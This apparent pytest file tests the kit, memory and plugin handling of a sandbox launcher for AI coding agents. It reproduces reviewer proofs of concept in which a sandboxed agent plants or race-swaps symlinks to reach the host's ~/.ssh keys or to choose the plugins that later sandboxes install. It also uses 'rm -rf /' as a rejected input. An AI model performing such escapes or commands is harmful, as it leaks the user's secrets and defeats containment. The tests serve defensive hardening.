"""Kits, project memory and plugins: happy, sad and edge cases end to end.

The launcher contracts for the wiring are in test_agent_sandbox_contracts.py; this file covers
sandbox/kits.py, sandbox/plugins.py, the doctor and wizard parts and whole runs through main()
with a fake backend (the sandbox itself is proven by the live suite).
"""
import importlib.util
import json
import os
from pathlib import Path
import shutil
import subprocess
import threading

import pytest

ROOT = Path(__file__).resolve().parents[1]


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, ROOT / path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


s = load("sandbox_for_kits_tests", "sandbox/agent_sandbox.py")
k = load("kits_for_tests", "sandbox/kits.py")
plugins = load("plugins_for_tests", "sandbox/plugins.py")
doctor = load("doctor_for_kits_tests", "sandbox/doctor.py")
wizard = load("wizard_for_kits_tests", "sandbox/wizard.py")
AGENTS = ("claude", "codex", "opencode")


@pytest.fixture(autouse=True)
def isolated(tmp_path, monkeypatch):
    home = tmp_path / "host"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    for name in ("XDG_DATA_HOME", "XDG_STATE_HOME", "XDG_CONFIG_HOME", "XDG_CACHE_HOME", "CODEX_HOME",
                 "CLAUDE_CONFIG_DIR"):
        monkeypatch.delenv(name, raising=False)
    return home


def data():
    return Path(os.environ["HOME"]) / ".local/share/sandbox-ai"


def make(root, files):
    for relative, text in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(text, bytes):
            path.write_bytes(text)
        else:
            path.write_text(text)
    return root


def args(tmp_path, agent="claude", *options):
    a = s.parse_args([agent, "--workspace", str(tmp_path / "work"), "--no-auth", *options])
    s.validate(a)
    return a


def check_nothing(path, label):
    return None


# --- templates and the demo plugin -------------------------------------------------------------------

@pytest.mark.parametrize("agent", AGENTS)
def test_templates_have_an_example_skill_and_memory_template(agent):
    """Every agent's default kit starts with a valid example skill and a memory template."""
    skill = (k.TEMPLATES / agent / "skills/sandbox-example/SKILL.md").read_text()
    front = skill.split("---")[1]
    assert "name: sandbox-example" in front and "description: " in front
    description = front.split("description: ", 1)[1].strip()
    assert 20 < len(description) <= 1024  # OpenCode's and Codex's limits
    assert (k.TEMPLATES / agent / k.MEMORY_FILE[agent][0]).is_file()
    plan = k.scan(agent, [("home", k.TEMPLATES / agent)])
    assert plan["notes"] == [] and k.summary(plan) == {"skills": ["sandbox-example"]}
    assert k.declarations(agent, plan["plugins"])[0:2] in (({}, []), (
        {"claude-plugins-official": {"source": "github", "repo": "anthropics/claude-plugins-official"},
         "sandbox-ai": {"source": "directory", "path": "/sandbox/marketplace"}}, ["sandcastle@sandbox-ai"]))


def test_demo_marketplace_and_plugin():
    manifest = json.loads((k.MARKETPLACE / ".claude-plugin/marketplace.json").read_text())
    assert manifest["name"] == "sandbox-ai"
    entry = manifest["plugins"][0]
    assert entry["name"] == "sandcastle" and (k.MARKETPLACE / entry["source"]).is_dir()
    plugin = json.loads((k.MARKETPLACE / entry["source"] / ".claude-plugin/plugin.json").read_text())
    assert plugin["name"] == "sandcastle"
    command = (k.MARKETPLACE / entry["source"] / "commands/sandcastle.md").read_text()
    art = command.split("```\n")[1].split("\n```")[0].splitlines()
    # A frame of equal width around the robot, its bucket and moulds, and the castle.
    assert len({len(line) for line in art}) == 1 and art[0].startswith(" .-") and art[-1].startswith(" '-")
    assert "[o__o]" in command and "(_______)" in command and "(*)" in command and "|>" in command


def test_packaging_ships_templates_and_marketplace():
    """Installed from PyPI, the package data must hold every file of sandbox/ that is not Python: templates, the
    marketplace, the web interface, the presets, the signers' keys (each new kind of file is caught here)."""
    import fnmatch
    tomllib = pytest.importorskip("tomllib")  # Python 3.11+
    patterns = tomllib.loads((ROOT / "pyproject.toml").read_text())["tool"]["setuptools"]["package-data"]["sandbox_ai"]
    for path in (ROOT / "sandbox").rglob("*"):
        if path.is_file() and path.suffix not in (".py", ".pyc") and "__pycache__" not in path.parts:
            relative = str(path.relative_to(ROOT / "sandbox"))
            assert any(fnmatch.fnmatch(relative, pattern) and relative.count("/") == pattern.count("/")
                       for pattern in patterns), relative
    manifest = (ROOT / "MANIFEST.in").read_text()
    assert all(f"graft sandbox/{name}" in manifest for name in ("templates", "web", "presets"))


# --- default kit -----------------------------------------------------------------------------------

def test_ensure_default_home_creates_once_and_never_overwrites():
    assert k.ensure_default_home("codex") is True
    skill = data() / "home/codex/skills/sandbox-example/SKILL.md"
    assert skill.is_file()
    # Edited or deleted examples stay as the user left them.
    skill.write_text("mine")
    (data() / "home/codex/AGENTS.md").unlink()
    assert k.ensure_default_home("codex") is False
    assert skill.read_text() == "mine" and not (data() / "home/codex/AGENTS.md").exists()


def test_ensure_default_home_respects_a_symlink_and_missing_templates(tmp_path, monkeypatch):
    (data() / "home").mkdir(parents=True)
    (data() / "home/claude").symlink_to(tmp_path)
    assert k.ensure_default_home("claude") is False and list(tmp_path.iterdir()) == [Path(os.environ["HOME"])]
    monkeypatch.setattr(k, "TEMPLATES", tmp_path / "none")
    assert k.ensure_default_home("opencode") is False and not (data() / "home/opencode").exists()


# --- sources and scan ------------------------------------------------------------------------------

def test_sources_order_and_errors(tmp_path):
    make(data() / "home/claude", {"CLAUDE.md": "x"})
    make(data() / "kits/b/claude", {"skills/one/SKILL.md": "x"})
    make(tmp_path / "mine/claude", {"commands/c.md": "x"})
    a = args(tmp_path, "claude", "--kit", "b", "--kit-dir", str(tmp_path / "mine"), "--kit", "b")
    assert [label for label, _ in k.sources(a)] == ["built-in", "home", "kit b", f"kit-dir {tmp_path / 'mine'}"]
    a = args(tmp_path, "claude", "--no-default-kit", "--kit", "b")
    assert [label for label, _ in k.sources(a)] == ["kit b"]  # without the built-in skill too
    with pytest.raises(ValueError, match="no codex/ directory"):
        k.sources(s.parse_args(["codex", "--kit-dir", str(tmp_path / "mine")]))
    with pytest.raises(ValueError, match="--kit NAME"):
        s.validate(s.parse_args(["claude", "--workspace", str(tmp_path / "w"), "--kit", "../etc"]))
    with pytest.raises(ValueError, match="kits for codex: none"):
        k.sources(s.parse_args(["codex", "--kit", "b"]))


def test_scan_merges_reports_and_refuses_conflicts(tmp_path):
    one = make(tmp_path / "one", {"skills/a/SKILL.md": "x", "skills/.hidden/SKILL.md": "x", "commands/c.md": "x",
                                  "prompts/p.md": "x", "README.md": "x", ".git/config": "x",
                                  "skills/nomd/other.txt": "x"})
    two = make(tmp_path / "two", {"skills/b/SKILL.md": "x", "agents/r.md": "x", "CLAUDE.md": "m"})
    plan = k.scan("claude", [("one", one), ("two", two)])
    assert k.summary(plan) == {"skills": ["a", "b", "nomd"], "agents": ["r.md"], "commands": ["c.md"]}
    assert plan["memory"] == ("two", two / "CLAUDE.md")
    assert any("prompts is not used for claude" in n for n in plan["notes"])
    assert any("README.md is not used" in n for n in plan["notes"])
    assert any("skill nomd has no SKILL.md" in n for n in plan["notes"])
    # Codex knows prompts but no commands.
    assert k.summary(k.scan("codex", [("one", one)])) == {"skills": ["a", "nomd"], "prompts": ["p.md"]}
    make(tmp_path / "three", {"agents/r.md": "y"})
    with pytest.raises(ValueError, match="agent 'r.md' comes from both two and three"):
        k.scan("claude", [("two", two), ("three", tmp_path / "three")])
    with pytest.raises(ValueError, match="CLAUDE.md comes from both"):
        k.scan("claude", [("two", two), ("four", make(tmp_path / "four", {"CLAUDE.md": "z"}))])
    with pytest.raises(ValueError, match="must be a directory"):
        k.scan("claude", [("five", make(tmp_path / "five", {"skills": "a file"}))])


# --- staging ---------------------------------------------------------------------------------------

def test_stage_copies_follows_links_and_keeps_scripts_executable(tmp_path):
    # A skill kept in a Git checkout, linked into the kit as a whole entry.
    checkout = make(tmp_path / "checkout/tool", {"SKILL.md": "tool", "scripts/helper.sh": "#!/bin/sh\necho hi\n",
                                                 "docs/x.txt": "x"})
    (checkout / "scripts/helper.sh").chmod(0o700)
    (checkout / "docs/same").symlink_to(checkout / "scripts", target_is_directory=True)  # below the entry: skipped
    (tmp_path / "secret").write_text("host secret")
    (checkout / "docs/key").symlink_to(tmp_path / "secret")  # out of the entry: skipped
    kit = make(tmp_path / "kit", {"skills/a/SKILL.md": "a", "commands/c.md": "c"})
    (kit / "skills/tool").symlink_to(checkout, target_is_directory=True)
    (kit / "skills/a/up").symlink_to(tmp_path / "checkout", target_is_directory=True)  # out of entry a
    plan = k.scan("claude", [("kit", kit)])
    (tmp_path / "staging").mkdir()
    mounts, notes = k.stage("claude", plan, tmp_path / "staging", check_nothing)
    assert mounts == [(tmp_path / "staging/skills", "/root/.claude/skills"),
                      (tmp_path / "staging/commands", "/root/.claude/commands")]
    staged = tmp_path / "staging/skills/tool/scripts/helper.sh"
    assert staged.read_text().startswith("#!/bin/sh") and not staged.is_symlink()
    assert staged.stat().st_mode & 0o777 == 0o755
    assert (tmp_path / "staging/commands/c.md").stat().st_mode & 0o777 == 0o644
    assert (tmp_path / "staging/skills/tool/docs/x.txt").read_text() == "x"
    assert not (tmp_path / "staging/skills/tool/docs/same").exists()
    assert not (tmp_path / "staging/skills/tool/docs/key").exists()
    assert not (tmp_path / "staging/skills/a/up").exists()
    assert sum("a symlink below a kit entry is not followed" in n for n in notes) == 3
    # The kit is untouched by staging.
    assert (kit / "skills/a/SKILL.md").read_text() == "a"


def test_stage_refuses_loops_limits_and_unsafe_sources(tmp_path, monkeypatch):
    kit = make(tmp_path / "kit", {"skills/a/SKILL.md": "a"})
    (kit / "skills/a/loop").symlink_to(kit / "skills/a", target_is_directory=True)
    (tmp_path / "s1").mkdir()
    _, notes = k.stage("claude", k.scan("claude", [("kit", kit)]), tmp_path / "s1", check_nothing)
    assert any("loop skipped: a symlink" in n for n in notes) and not (tmp_path / "s1/skills/a/loop").exists()
    (kit / "skills/a/loop").unlink()
    deep = kit / "skills/a"
    for _ in range(k.KIT_DEPTH):
        deep = deep / "d"
    deep.mkdir(parents=True)
    (tmp_path / "s1b").mkdir()
    with pytest.raises(ValueError, match="nested deeper"):
        k.stage("claude", k.scan("claude", [("kit", kit)]), tmp_path / "s1b", check_nothing)
    shutil.rmtree(kit / "skills/a/d")
    (kit / "skills/a/dangling").symlink_to(tmp_path / "gone")
    os.mkfifo(kit / "skills/a/fifo")
    (tmp_path / "s2").mkdir()
    _, notes = k.stage("claude", k.scan("claude", [("kit", kit)]), tmp_path / "s2", check_nothing)
    assert any("dangling" in n for n in notes) and any("fifo skipped" in n for n in notes)
    monkeypatch.setattr(k, "KIT_FILES", 1)
    make(kit, {"skills/a/more.md": "x"})
    (tmp_path / "s3").mkdir()
    with pytest.raises(ValueError, match="more than 1 files"):
        k.stage("claude", k.scan("claude", [("kit", kit)]), tmp_path / "s3", check_nothing)

    def refuse(path, label):
        if "secret" in str(path.resolve()):
            raise ValueError(f"{label}: {path} lies inside a workspace")
    make(tmp_path / "secret", {"x": "x"})
    (kit / "skills/a/fifo").unlink()
    (kit / "skills/a/dangling").unlink()
    (kit / "skills/a/more.md").unlink()
    (kit / "skills/link").symlink_to(tmp_path / "secret", target_is_directory=True)  # an entry: its target checked
    monkeypatch.setattr(k, "KIT_FILES", 5000)
    (tmp_path / "s4").mkdir()
    with pytest.raises(ValueError, match="lies inside a workspace"):
        k.stage("claude", k.scan("claude", [("kit", kit)]), tmp_path / "s4", refuse)


@pytest.mark.parametrize("moment", ["after-listing", "after-lstat", "after-open", "thread"])
def test_stage_never_copies_through_a_folder_swapped_for_a_symlink(tmp_path, monkeypatch, moment):
    """Review 5, M4: a kit entry linked from a checkout an agent can write. While the copy runs, the agent swaps a
    folder of the entry for a symlink to the host's ~/.ssh: whenever it does, nothing of ~/.ssh is copied."""
    ssh = make(tmp_path / "host/.ssh", {"id_ed25519": "HOST-PRIVATE-KEY\n", "zz_id_ed25519": "HOST-PRIVATE-KEY\n"})
    entry = make(tmp_path / "checkout/skill", {"SKILL.md": "x", "sub/zz_id_ed25519": "decoy\n"})
    for i in range(3000 if moment == "thread" else 3):
        (entry / f"sub/a{i:05d}").write_text("decoy\n")
    kit = tmp_path / "kit"
    (kit / "skills").mkdir(parents=True)
    (kit / "skills/skill").symlink_to(entry, target_is_directory=True)
    swapped = []

    def swap():
        if not swapped:
            swapped.append(True)
            os.rename(entry / "sub", entry / "sub.real")
            os.symlink(ssh, entry / "sub")
    if moment == "after-listing":
        listdir = os.listdir
        monkeypatch.setattr(k.os, "listdir", lambda fd: [listdir(fd), swap()][0])
    elif moment == "after-lstat":
        real_stat = os.stat

        def stat_then_swap(name, *args, **kwargs):
            info = real_stat(name, *args, **kwargs)
            if name == "sub" and kwargs.get("dir_fd") is not None:
                swap()
            return info
        monkeypatch.setattr(k.os, "stat", stat_then_swap)
    elif moment == "after-open":
        real_open = os.open

        def open_then_swap(path, flags, *args, **kwargs):
            fd = real_open(path, flags, *args, **kwargs)
            if path == "sub":
                swap()
            return fd
        monkeypatch.setattr(k.os, "open", open_then_swap)
    else:  # the review's proof of concept: a thread, as an agent would do it
        threading.Timer(0.02, swap).start()
    plan = k.scan("claude", [("kit", kit)])
    (tmp_path / "staging").mkdir()
    _, notes = k.stage("claude", plan, tmp_path / "staging", check_nothing)
    monkeypatch.undo()
    if moment == "thread":
        for _ in range(200):
            if swapped:
                break
            threading.Event().wait(0.01)
    assert swapped
    copied = [path for path in (tmp_path / "staging").rglob("*") if path.is_file()]
    assert copied and all(b"HOST-PRIVATE-KEY" not in path.read_bytes() for path in copied)
    assert not any(path.is_symlink() for path in (tmp_path / "staging").rglob("*"))
    assert not (tmp_path / "staging/skills/skill/sub/id_ed25519").exists()
    if moment in ("after-listing", "after-lstat"):
        assert not (tmp_path / "staging/skills/skill/sub").exists()
        assert any("sub skipped" in note for note in notes)
    if moment == "after-open":  # the folder it opened: the real one, wherever it was moved
        assert (tmp_path / "staging/skills/skill/sub/zz_id_ed25519").read_text() == "decoy\n"


def test_kit_inside_workspace_is_refused(tmp_path):
    """A kit the agent can write would let it change what other sandboxes run."""
    make(tmp_path / "work/kit/claude", {"skills/a/SKILL.md": "x"})
    with pytest.raises(ValueError, match="agent can change"):
        args(tmp_path, "claude", "--kit-dir", str(tmp_path / "work/kit"))


def agent_wrote_a_link(home, how, workspace=None):
    """Review 6, M-A: the user's kit links to a skill in a checkout (~/src/proj); an agent that works on that checkout
    (HOW: in an earlier run, in a sandbox running now, in a kept session, or as this run's own workspace) replaced
    the skill's folder with a link to ~/.ssh."""
    ssh = make(home / ".ssh", {"id_ed25519": "HOST-PRIVATE-KEY\n"})
    checkout = make(home / "src/proj", {"skills/foo/SKILL.md": "---\nname: foo\n---\n", "CLAUDE.md": "memory"})
    shutil.rmtree(checkout / "skills/foo")
    (checkout / "skills/foo").symlink_to(ssh, target_is_directory=True)
    if how == "earlier run":
        s.remember_exposed(None, [checkout])
    elif how == "running sandbox":
        run = s.runs_dir() / "claude-1234"
        run.mkdir(parents=True)
        (run / "run.json").write_text(json.dumps({"run": "claude-1234", "workspace": str(checkout)}))
    elif how == "kept session":
        session = Path(os.environ["HOME"]) / ".local/state/sandbox-ai/sessions/s1"
        session.mkdir(parents=True)
        (session / "session.json").write_text(json.dumps({"workspace": str(checkout)}))
    return ssh, checkout


@pytest.mark.parametrize("how", ["earlier run", "running sandbox", "kept session", "same workspace"])
def test_review6_kit_link_re_pointed_by_an_agent_is_refused(tmp_path, isolated, how):
    """The reviewer's PoC: ~/kit/claude/skills/foo -> ~/src/proj/skills/foo, which an agent replaced with a link to
    ~/.ssh. The next start refuses, naming the link and what to do; nothing of ~/.ssh is staged."""
    _, checkout = agent_wrote_a_link(isolated, how)
    kit = isolated / "kit/claude/skills"
    kit.mkdir(parents=True)
    (kit / "foo").symlink_to(checkout / "skills/foo", target_is_directory=True)
    workspace = checkout if how == "same workspace" else tmp_path / "work"
    a = s.parse_args(["claude", "--workspace", str(workspace), "--no-auth", "--no-default-kit", "--kit-dir",
                      str(isolated / "kit")])
    plan = k.scan("claude", k.sources(a))
    (tmp_path / "staging").mkdir()
    expected = "agent can change" if how == "same workspace" else "is a symlink inside .*proj .*planted.*kits add-skill"
    with pytest.raises(ValueError, match=f"on the way to .*kit/claude/skills/foo.*{expected}"):
        k.stage("claude", plan, tmp_path / "staging", s.kit_check(a))
    assert not any(b"HOST-PRIVATE-KEY" in path.read_bytes() for path in (tmp_path / "staging").rglob("*")
                   if path.is_file())


def test_review6_kit_link_to_a_real_folder_in_a_checkout_is_copied_with_a_note(tmp_path, isolated):
    """The README's own example still works: a kit entry linked to a real skill folder in a checkout. When a sandbox
    worked on that checkout, the start says that what it wrote there reaches every sandbox given the kit."""
    checkout = make(isolated / "src/proj", {"skills/foo/SKILL.md": "---\nname: foo\n---\n"})
    s.remember_exposed(None, [checkout])
    kit = isolated / "kit/claude/skills"
    kit.mkdir(parents=True)
    (kit / "foo").symlink_to(checkout / "skills/foo", target_is_directory=True)
    a = s.parse_args(["claude", "--workspace", str(tmp_path / "work"), "--no-auth", "--no-default-kit",
                      "--kit-dir", str(isolated / "kit")])
    plan = k.scan("claude", k.sources(a))
    (tmp_path / "staging").mkdir()
    k.stage("claude", plan, tmp_path / "staging", s.kit_check(a))
    assert (tmp_path / "staging/skills/foo/SKILL.md").is_file()
    notes = s.kit_source_notes(plan, a)
    assert len(notes) == 1 and "reaches every sandbox this kit is given to" in notes[0]


def test_review6_memory_template_through_a_planted_link_is_refused(tmp_path, isolated):
    """The kit's memory template linked to a checkout's CLAUDE.md, which an agent re-pointed at a host file."""
    ssh, checkout = agent_wrote_a_link(isolated, "earlier run")
    (checkout / "CLAUDE.md").unlink()
    (checkout / "CLAUDE.md").symlink_to(ssh / "id_ed25519")
    kit = isolated / "kit/claude"
    kit.mkdir(parents=True)
    (kit / "CLAUDE.md").symlink_to(checkout / "CLAUDE.md")
    a = s.parse_args(["claude", "--workspace", str(tmp_path / "work"), "--no-auth"])
    home = tmp_path / "home"
    home.mkdir()
    with pytest.raises(ValueError, match="on the way to .*kit/claude/CLAUDE.md.*symlink inside .*proj"):
        k.memory_prepare("claude", tmp_path / "proj2", home, ("kit-dir x", kit / "CLAUDE.md"), s.kit_check(a))
    assert not k.memory_store(tmp_path / "proj2", "claude").exists()
    assert "HOST-PRIVATE-KEY" not in "".join(p.read_text() for p in home.rglob("*") if p.is_file())


def test_review6_plugin_declaration_through_a_planted_link_is_refused(tmp_path, isolated):
    """A kit's marketplaces.json linked into a checkout: an agent re-pointing it would choose the plugins (programs)
    sandboxes and the plugin installer get. The start (declarations) and `sandbox-ai plugins` refuse."""
    _, checkout = agent_wrote_a_link(isolated, "earlier run")
    (isolated / "agent.json").write_text(json.dumps({"plugins": ["evil@sandbox-ai"]}))
    (checkout / "marketplaces.json").symlink_to(isolated / "agent.json")
    kit = s.load_kits_module().default_home("claude")
    kit.mkdir(parents=True)
    (kit / "marketplaces.json").symlink_to(checkout / "marketplaces.json")
    a = s.parse_args(["claude", "--workspace", str(tmp_path / "work"), "--no-auth"])
    with pytest.raises(ValueError, match="on the way to .*marketplaces.json.*symlink inside .*proj"):
        k.declarations("claude", [("home", kit / "marketplaces.json")], check=s.kit_check(a))
    with pytest.raises(ValueError, match="on the way to .*marketplaces.json.*symlink inside .*proj"):
        k.read_declaration("home", kit / "marketplaces.json", s.kit_check())
    ran = []
    with pytest.raises(ValueError, match="symlink inside .*proj"):
        plugins.sync(out=lambda line: None, runner=lambda command: ran.append(command))
    assert ran == []


def test_review6_kit_dir_through_a_planted_link_is_refused(tmp_path, isolated):
    """--kit-dir ~/kitlink, the user's link to a kit kept in a checkout, whose folder an agent replaced with a link."""
    elsewhere = make(isolated / "elsewhere/claude", {"skills/x/SKILL.md": "x"}).parent
    checkout = isolated / "src/proj"
    checkout.mkdir(parents=True)
    (checkout / "kit").symlink_to(elsewhere, target_is_directory=True)
    (isolated / "kitlink").symlink_to(checkout / "kit", target_is_directory=True)
    s.remember_exposed(None, [checkout])
    with pytest.raises(ValueError, match="--kit-dir .*kitlink goes through the symlink .*proj/kit"):
        args(tmp_path, "claude", "--kit-dir", str(isolated / "kitlink"))
    run = s.runs_dir() / "r"  # the same for the workspace of a sandbox running now
    run.mkdir(parents=True)
    (run / "run.json").write_text(json.dumps({"workspace": str(checkout)}))
    s.exposed_registry().write_text("[]")
    with pytest.raises(ValueError, match="--kit-dir .*kitlink goes through the symlink .*proj/kit"):
        args(tmp_path, "claude", "--kit-dir", str(isolated / "kitlink"))


# --- project memory --------------------------------------------------------------------------------

def test_memory_seeded_once_kept_per_project_and_never_written_to_the_kit(tmp_path):
    template = make(tmp_path / "kit", {"CLAUDE.md": "template"}) / "CLAUDE.md"
    home = tmp_path / "home"
    home.mkdir()
    manifest, seeded, store, _ = k.memory_prepare("claude", tmp_path / "proj", home, ("kit x", template))
    assert seeded == "kit x" and (home / ".claude/CLAUDE.md").read_text() == "template"
    (home / ".claude/CLAUDE.md").write_text("learned")
    assert k.memory_save("claude", tmp_path / "proj", home, manifest) == (1, [])
    assert template.read_text() == "template"  # never back to the kit
    # A new HOME of the same project gets the project's memory, not the template again.
    other = tmp_path / "home2"
    other.mkdir()
    _, seeded, _, _ = k.memory_prepare("claude", tmp_path / "proj", other, ("kit x", template))
    assert seeded is None and (other / ".claude/CLAUDE.md").read_text() == "learned"
    # Another project starts from the template.
    third = tmp_path / "home3"
    third.mkdir()
    k.memory_prepare("claude", tmp_path / "proj2", third, ("kit x", template))
    assert (third / ".claude/CLAUDE.md").read_text() == "template"
    assert k.memory_store(tmp_path / "proj", "claude") != k.memory_store(tmp_path / "proj2", "claude")
    # A deleted memory file stays deleted (no new template).
    (other / ".claude/CLAUDE.md").unlink()
    k.memory_save("claude", tmp_path / "proj", other, {".claude/CLAUDE.md": k.digest(b"learned")})
    fourth = tmp_path / "home4"
    fourth.mkdir()
    k.memory_prepare("claude", tmp_path / "proj", fourth, ("kit x", template))
    assert not (fourth / ".claude/CLAUDE.md").exists()


def test_memory_two_sandboxes_of_one_project_keep_both_changes(tmp_path):
    first, second = tmp_path / "a", tmp_path / "b"
    first.mkdir(), second.mkdir()
    m1, _, store, _ = k.memory_prepare("claude", tmp_path / "proj", first)
    m2, _, _, _ = k.memory_prepare("claude", tmp_path / "proj", second)
    make(first, {".claude/projects/-work/memory/one.md": "1"})
    make(second, {".claude/projects/-work/memory/two.md": "2", ".claude/CLAUDE.md": "b"})
    k.memory_save("claude", tmp_path / "proj", first, m1)
    k.memory_save("claude", tmp_path / "proj", second, m2)
    files, _, _ = k.collect(store, "claude")
    assert files == {".claude/projects/-work/memory/one.md": b"1", ".claude/projects/-work/memory/two.md": b"2",
                     ".claude/CLAUDE.md": b"b"}
    # A file one sandbox deletes is removed only if nobody changed it meanwhile.
    third, fourth = tmp_path / "c", tmp_path / "d"
    third.mkdir(), fourth.mkdir()
    m3, _, _, _ = k.memory_prepare("claude", tmp_path / "proj", third)
    m4, _, _, _ = k.memory_prepare("claude", tmp_path / "proj", fourth)
    (fourth / ".claude/projects/-work/memory/one.md").write_text("changed")
    k.memory_save("claude", tmp_path / "proj", fourth, m4)
    (third / ".claude/projects/-work/memory/one.md").unlink()
    (third / ".claude/projects/-work/memory/two.md").unlink()
    k.memory_save("claude", tmp_path / "proj", third, m3)
    files, _, _ = k.collect(store, "claude")
    assert files[".claude/projects/-work/memory/one.md"] == b"changed"
    assert ".claude/projects/-work/memory/two.md" not in files


def test_memory_refuses_symlinks_and_limits(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    manifest, _, store, _ = k.memory_prepare("codex", tmp_path / "proj", home)
    (tmp_path / "secret").write_text("host file")
    (home / ".codex").mkdir(exist_ok=True)
    (home / ".codex/AGENTS.md").symlink_to(tmp_path / "secret")
    changed, notes = k.memory_save("codex", tmp_path / "proj", home, manifest)
    assert changed == 0 and notes == [".codex/AGENTS.md skipped: symlink"]
    assert not (store / ".codex/AGENTS.md").exists()
    # The same for Claude's auto memory directory: a symlink there is not followed.
    claude_home = tmp_path / "claude-home"
    claude_home.mkdir()
    m, _, claude_store, _ = k.memory_prepare("claude", tmp_path / "proj", claude_home)
    (tmp_path / "outside-dir").mkdir()
    (tmp_path / "outside-dir/MEMORY.md").write_text("host")
    (claude_home / ".claude/projects").mkdir(parents=True)
    (claude_home / ".claude/projects/-work").mkdir()
    (claude_home / ".claude/projects/-work/memory").symlink_to(tmp_path / "outside-dir", target_is_directory=True)
    assert k.memory_save("claude", tmp_path / "proj", claude_home, m) == (
        0, [".claude/projects/-work/memory skipped: symlink or not a directory"])
    # A planted symlink in a reused HOME is removed, never written through.
    k.memory_prepare("codex", tmp_path / "proj", home)
    assert not (home / ".codex/AGENTS.md").exists() and (tmp_path / "secret").read_text() == "host file"
    # A parent directory that is a symlink is refused.
    (tmp_path / "out").mkdir()
    (home / ".codex").rename(tmp_path / "codex-old")
    (home / ".codex").symlink_to(tmp_path / "out", target_is_directory=True)
    with pytest.raises(ValueError, match="symlink"):
        k.memory_prepare("codex", tmp_path / "proj", home)
    assert list((tmp_path / "out").iterdir()) == []
    monkeypatch.setattr(k, "MEMORY_FILES", 2)
    good = tmp_path / "good"
    good.mkdir()
    manifest, _, _, _ = k.memory_prepare("claude", tmp_path / "p3", good)
    make(good, {f".claude/projects/-work/memory/{n}.md": "x" for n in range(3)})
    # Over the limit: what fits is kept, the rest is reported, and nothing counts as deleted.
    changed, notes = k.memory_save("claude", tmp_path / "p3", good, manifest)
    assert changed == 2 and any("larger than 2 files" in n for n in notes)


def test_memory_store_symlink_refused(tmp_path):
    store = k.memory_store(tmp_path / "proj", "claude")
    store.parent.mkdir(parents=True)
    store.symlink_to(tmp_path, target_is_directory=True)
    home = tmp_path / "home"
    home.mkdir()
    with pytest.raises(ValueError, match="symlink"):
        k.memory_prepare("claude", tmp_path / "proj", home)


# --- plugin declarations ---------------------------------------------------------------------------

def declare(tmp_path, name, document):
    path = tmp_path / f"{name}.json"
    path.write_text(json.dumps(document))
    return (name, path)


@pytest.mark.parametrize("source, error", [
    ({"source": "github", "repo": "a/b"}, None),
    ({"source": "git", "url": "https://git.example.org/m.git"}, None),
    ({"source": "url", "url": "https://example.org/marketplace.json"}, None),
    ({"source": "directory", "path": "/sandbox/marketplace"}, None),
    ({"source": "directory", "path": "/home/me/m"}, "sandbox-ai's own"),
    ({"source": "github", "repo": "a/b/c"}, "OWNER/REPO"),
    ({"source": "git", "url": "http://git.example.org/m.git"}, "https://"),
    ({"source": "git", "url": "https://h/x y"}, "https://"),
    ({"source": "npm", "package": "x"}, "supported sources"),
    ({"source": "github", "repo": "a/b", "ref": "main"}, "supported sources"),
    ("a/b", "must be an object"),
])
def test_check_source(source, error):
    if error:
        with pytest.raises(ValueError, match=error):
            k.check_source("m", source)
    else:
        assert k.check_source("m", source) == source


def test_declarations(tmp_path):
    home = declare(tmp_path, "home", {"marketplaces": {"m": {"source": {"source": "github", "repo": "o/r"}}},
                                      "plugins": ["p@m", "q@unknown"]})
    kit = declare(tmp_path, "kit", {"marketplaces": {"m": {"source": {"source": "github", "repo": "o/r"}}},
                                    "plugins": ["p@m", "r@m"]})
    marketplaces, listed, notes = k.declarations("claude", [home, kit])
    assert marketplaces == {"m": {"source": "github", "repo": "o/r"}} and listed == ["p@m", "r@m"]
    assert notes == ["plugin q@unknown skipped: no kit declares marketplace unknown"]
    clash = declare(tmp_path, "clash", {"marketplaces": {"m": {"source": {"source": "github", "repo": "x/y"}}}})
    with pytest.raises(ValueError, match="marketplace m comes from both home and clash"):
        k.declarations("claude", [home, clash])
    for bad, error in [({"plugins": "p@m"}, "list of strings"), ({"plugins": ["p"]}, "NAME@MARKETPLACE"),
                       ({"extra": 1}, "unknown keys"), ([], "JSON object"),
                       ({"marketplaces": {"../x": {"source": {"source": "github", "repo": "a/b"}}}}, "invalid")]:
        with pytest.raises(ValueError, match=error):
            k.declarations("claude", [declare(tmp_path, "bad", bad)])
    # OpenCode: npm names only; Codex: noted as unsupported.
    oc = declare(tmp_path, "oc", {"plugins": ["opencode-x", "@scope/pkg@1.2.3"], "marketplaces": {}})
    assert k.declarations("opencode", [oc])[1] == ["opencode-x", "@scope/pkg@1.2.3"]
    with pytest.raises(ValueError, match="npm package"):
        k.declarations("opencode", [declare(tmp_path, "ocbad", {"plugins": ["rm -rf /"]})])
    assert "not supported for Codex" in k.declarations("codex", [kit])[2][0]
    (tmp_path / "huge.json").write_text(" " * (k.DECLARATION_LIMIT + 2) + "{}")
    with pytest.raises(ValueError, match="JSON object"):
        k.declarations("claude", [("huge", tmp_path / "huge.json")])


def test_installed_reads_only_valid_entries():
    store = data() / "plugins/claude/.claude/plugins"
    make(store, {"known_marketplaces.json": json.dumps({"ok": {"source": {}}, "../bad": {}, "x": "no"}),
                 "installed_plugins.json": json.dumps({"plugins": {"a@ok": [], "bad": [], "b@ok": []}})})
    known, installed = k.installed()
    assert set(known) == {"ok"} and set(installed) == {"a@ok", "b@ok"}
    (store / "installed_plugins.json").write_text("not json")
    assert k.installed()[1] == {}


# --- sandbox-ai plugins ----------------------------------------------------------------------------

class FakeClaude:
    """Stands in for `claude plugin ...` in the store sandbox: records commands, writes the store."""
    def __init__(self, fail=()):
        self.commands, self.fail = [], set(fail)

    def __call__(self, command):
        self.commands.append(command)
        args = command[command.index("--", command.index("--state-dir")) + 1:][1:]
        store = Path(command[command.index("--state-dir") + 1]) / ".claude/plugins"
        store.mkdir(parents=True, exist_ok=True)
        known_path, installed_path = store / "known_marketplaces.json", store / "installed_plugins.json"
        known = json.loads(known_path.read_text()) if known_path.exists() else {}
        installed = json.loads(installed_path.read_text()) if installed_path.exists() else {"version": 2, "plugins": {}}
        status = 1 if " ".join(args) in self.fail else 0
        if status == 0 and args[:2] == ["marketplace", "add"]:
            name = {"/sandbox/marketplace": "sandbox-ai",
